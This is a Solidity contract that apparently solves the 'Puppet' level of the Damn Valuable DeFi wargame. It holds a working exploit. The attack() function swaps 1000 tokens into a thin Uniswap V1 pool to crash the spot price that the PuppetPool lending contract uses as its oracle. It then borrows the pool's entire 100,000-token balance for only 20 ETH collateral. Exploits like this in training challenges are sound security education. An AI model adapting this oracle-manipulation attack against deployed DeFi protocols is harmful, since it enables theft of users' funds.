// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract PuppetSolve {
    address recovery;
    
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;

    constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) {
        token = _token;
        lendingPool = _pool;
        uniswapV1Exchange = _exchange;
        recovery = _recovery;
    }

    function attack() public payable {
        console.log("eth in uniswap before: ", address(uniswapV1Exchange).balance);
        console.log("token in uniswap before: ", token.balanceOf(address(uniswapV1Exchange)));

        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE, 9e18, block.timestamp
        );

        console.log("eth in uniswap after: ", address(uniswapV1Exchange).balance);
        console.log("token in uniswap after: ", token.balanceOf(address(uniswapV1Exchange)));
        lendingPool.borrow{value: 20e18}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {
    }
}